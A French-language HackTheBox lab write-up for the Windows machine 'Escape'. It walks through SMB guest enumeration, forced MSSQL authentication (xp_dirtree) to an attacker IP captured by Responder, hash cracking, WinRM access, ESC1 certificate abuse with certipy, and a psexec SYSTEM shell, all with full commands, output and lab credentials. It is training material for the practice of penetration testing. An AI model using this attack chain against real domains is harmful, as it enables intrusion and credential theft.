---
title: HTB | Escape
description: Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user ryan.cooper. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.
slug: escape-htb
date: 2025-09-10 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Windows
 - Medium
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Escape cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Escape</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Windows</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.202</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Medium</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
# SQL Server
PublicUser  : GuestUserCantWrite1
sql_svc     : REGGIE1234ronnie
Ryan.cooper : NuclearMosquito3
```

## Enumeration

### nmap

```bash
$ nmap -sC -sV -An -T4 -vvv -p- 10.10.11.202
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-10 22:21:01Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4cc647ebb2c23ef4721d7028809d82
| SHA-1: d88d12ae8a50fcf12242909e3dd75cff92d1a480
| -----BEGIN CERTIFICATE-----
| MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
| I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-10T22:22:35+00:00; +8h00m00s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4cc647ebb2c23ef4721d7028809d82
| SHA-1: d88d12ae8a50fcf12242909e3dd75cff92d1a480
| -----BEGIN CERTIFICATE-----
| MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
| I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-10T22:22:34+00:00; +7h59m59s from scanner time.
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-10T22:17:26
| Not valid after:  2055-09-10T22:17:26
| MD5:   8f5d163bc1ef9dbb2b789cdf2d7b5a90
| SHA-1: 6c89bf0840566f823a006405fce65a4f0570de19
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQfAGJqsgHZopA2ARCvdHiZTANBgkqhkiG9w0BAQsFADA7
| JfvGOQ==
|_-----END CERTIFICATE-----
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-09-10T22:22:35+00:00; +8h00m00s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-10T22:22:35+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4cc647ebb2c23ef4721d7028809d82
| SHA-1: d88d12ae8a50fcf12242909e3dd75cff92d1a480
| -----BEGIN CERTIFICATE-----
| I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4cc647ebb2c23ef4721d7028809d82
| SHA-1: d88d12ae8a50fcf12242909e3dd75cff92d1a480
| -----BEGIN CERTIFICATE-----
| MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
| I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-10T22:22:34+00:00; +7h59m59s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49687/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| smb2-time: 
|   date: 2025-09-10T22:21:54
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63970/tcp): CLEAN (Timeout)
|   Check 2 (port 24393/tcp): CLEAN (Timeout)
|   Check 3 (port 50586/udp): CLEAN (Timeout)
|   Check 4 (port 24268/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

## Foothold

### SMB Share ENumeration - guest
A l'aide de l'utilisateur **guest** et sans mot de passe, on réussi à lister les SMB SHARES. Le share **Public** est accessible en lecture.
```bash
$ nxc smb 10.10.11.202 -u 'guest' -p '' --shares                                                                               
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share 
```

### Public Share - "SQL Server Procedures.pdf"
On trouve un fichier "SQL Server Procedures.pdf" dans le share **Public** à l'aide de l'utilisateur **guest**. J'utilise ici uniquement **nxc** pour extraire le fichier.
```bash
$ nxc smb 10.10.11.202 -u 'guest' -p '' -M spider_plus
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 
SPIDER_PLUS 10.10.11.202    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.202    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.11.202    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.202    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.11.202    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.202    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.202    445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share 
SPIDER_PLUS 10.10.11.202    445    DC               [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.10.11.202.json".
SPIDER_PLUS 10.10.11.202    445    DC               [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Public, SYSVOL)
SPIDER_PLUS 10.10.11.202    445    DC               [*] SMB Readable Shares:  2 (IPC$, Public)
SPIDER_PLUS 10.10.11.202    445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.202    445    DC               [*] Total folders found:  0
SPIDER_PLUS 10.10.11.202    445    DC               [*] Total files found:    1
SPIDER_PLUS 10.10.11.202    445    DC               [*] File size average:    48.39 KB
SPIDER_PLUS 10.10.11.202    445    DC               [*] File size min:        48.39 KB
SPIDER_PLUS 10.10.11.202    445    DC               [*] File size max:        48.39 KB

$ cat /root/.nxc/modules/nxc_spider_plus/10.10.11.202.json 
{
    "Public": {
        "SQL Server Procedures.pdf": {
            "atime_epoch": "2022-11-19 12:50:54",
            "ctime_epoch": "2022-11-17 20:47:32",
            "mtime_epoch": "2022-11-19 12:51:25",
            "size": "48.39 KB"
        }
    }
}

$ nxc smb 10.10.11.202 -u 'guest' -p '' --get-file "\\SQL Server Procedures.pdf" "SQL Server Procedures.pdf" --share Public
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest: 
SMB         10.10.11.202    445    DC               [*] Copying "\SQL Server Procedures.pdf" to "SQL Server Procedures.pdf"
SMB         10.10.11.202    445    DC               [+] File "\SQL Server Procedures.pdf" was downloaded to "SQL Server Procedures.pdf"
```

### Credentials for MSSQL
Le document "**SQL Server Procedures.pdf**" est une procedure pour se connecter à une instance de **SQL Server**.

Ce document fait mention de plusieurs utilisateurs : Ryan, Tom, brandon.brown.  
On récupère même des credentials pour se connecter au serveur SQL :
- PublicUser : `GuestUserCantWrite1`
```bash
Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

### MSSQL : xp_dirtree and responder
En utilisant **mssqlclient**, on se connecte au sql server avec l'utilisateur récupéré.

On peut alors effectuer une requête avec la commande `xp_dirtree` afin d'effectuer une fausse requête pour énumerer un share sur notre ordinateur (IP de l'attaquant).  
Dans le même temps on lance un **responder** qui se met en attente. L'idée est la commande est executé de manière authentifier avec l'utilisateur **sql_svc**, et le responder peut intercepter ses credentials.
```bash
mssqlclient.py "DC"/"PublicUser":"GuestUserCantWrite1"@"10.10.11.202"
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.10\fake\file
subdirectory   depth   file   
------------   -----   ----   
```
Ici, on observe la reception du hachage du mot de passe de l'utilisateur `sql_svc`.
```bash
$ responder -I tun0 -w -F                                                                                                                       
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
...

[+] Listening for events...

[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:1122334455667788:0ED55C287EF37F6AD239ED0D6FE449A0:010100000000000000B9CE454A23DC018C349009419598CF000000000200080044004C005200500001001E00570049004E002D005A004A00320059004300360033004D0035003400480004003400570049004E002D005A004A00320059004300360033004D003500340048002E0044004C00520050002E004C004F00430041004C000300140044004C00520050002E004C004F00430041004C000500140044004C00520050002E004C004F00430041004C000700080000B9CE454A23DC0106000400020000000800300030000000000000000000000000300000051C4546D071DE4532ED8EA78B4BE4B4FB7296E7379A3F3F9319A487E526B2A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310030000000000000000000
```

### Hashcat : sql_svc password
On trouve le mot de passe de **sql_svc** à l'aide de hashcat et la liste rockyou.txt.
```bash
$ hashcat -m 5600 ./hash.txt ~/wordlists/rockyou.txt --show
SQL_SVC::sequel:112233.....0000000:REGGIE1234ronnie
```

### ERRORLOG.BAK : Ryan.Cooper password
On peut alors se connecter au compte sql_svc avec evilwinrm et obtenir un powershell sur la machine :
```bash
$ evil-winrm -u 'sql_svc' -p 'REGGIE1234ronnie' -i "10.10.11.202"
...
```
On trouve le mot de passe de **Ryan.cooper** dans un fichier de logs de SQL Server : `NuclearMosquito3`
```bash
*Evil-WinRM* PS C:\SQLServer\Logs> ls

    Directory: C:\SQLServer\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
*Evil-WinRM* PS C:\SQLServer\Logs> download "C:/SQLServer/Logs/ERRORLOG.BAK"
                                        
Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command
                                        
Info: Downloading C:/SQLServer/Logs/ERRORLOG.BAK to ERRORLOG.BAK

----------------------------------

$ cat ERRORLOG.BAK | grep -i pass
2022-11-18 13:43:06.75 spid18s     Password policy update was successful.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]

$ evil-winrm -u 'Ryan.Cooper' -p 'NuclearMosquito3' -i "10.10.11.202"
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> type "C:/Users/Ryan.Cooper/Desktop/user.txt"
d3b6.....cd0e
```

## Privilege Escalation : ESC1 Template
When a certificate template allows to specify a subjectAltName, it is possible to request a certificate for another user. It can be used for privileges escalation if the EKU specifies Client Authentication or ANY.

### Enumeration : certipy find
```bash
$ certipy find -u 'Ryan.cooper' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
[*] Got CA configuration for 'sequel-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

### Requesting a Malicious Certificate
On demande un certificat pour Administrator à travers le template vulnérable :
```bash
$ certipy req -username "Ryan.cooper@sequel.htb" -p "NuclearMosquito3" -target 'dc.sequel.htb' -ca "sequel-DC-CA" -template "UserAuthentication" -upn "Administrator@sequel.htb" -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc.sequel.htb' at '127.0.0.53'
[+] Trying to resolve 'SEQUEL.HTB' at '127.0.0.53'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 17
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

### Fixing Kerberos Clock Skew (KRB_AP_ERR_SKEW)
L’attaque échoue d’abord à cause d’un décalage horaire (KRB_AP_ERR_SKEW).  
En ajustant l’heure avec faketime et l’heure réelle du DC, le problème est corrigé.
```bash
$ date
Fri Sep 12 12:03:10 AM CEST 2025

$ ntpdate -q 10.10.11.202
2025-09-12 08:20:53.85924 (+0200) +28800.935013 +/- 0.010303 10.10.11.202 s1 no-leap

$ certipy auth -pfx administrator.pfx       
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

$ faketime "$(date +'%Y-%m-%d') $(net time -S 10.10.11.202 | awk '{print $4}')" zsh

$ date
Fri Sep 12 08:03:39 AM CEST 2025

$ ntpdate -q 10.10.11.202
2025-09-12 08:03:44.141842 (+0200) -0.075273 +/- 0.010154 10.10.11.202 s1 no-leap
```

### Getting a TGT as Administrator
Avec le certificat généré, on obtient un **TGT** et le **hash NT** de l’Administrator :
```bash
$ certipy auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

### Gaining Administrator Shell (psexec)
En utilisant le TGT et l'outil psexec.py, on obtient un shell en tant que `nt authority\system` :
```bash
$ export KRB5CCNAME="administrator.ccache"

$ psexec.py -k -no-pass sequel.htb/Administrator@dc.sequel.htb 
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.sequel.htb.....
[*] Found writable share ADMIN$
[*] Uploading file zjPAtFqg.exe
[*] Opening SVCManager on dc.sequel.htb.....
[*] Creating service cbfM on dc.sequel.htb.....
[*] Starting service cbfM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
1991.....91d7
```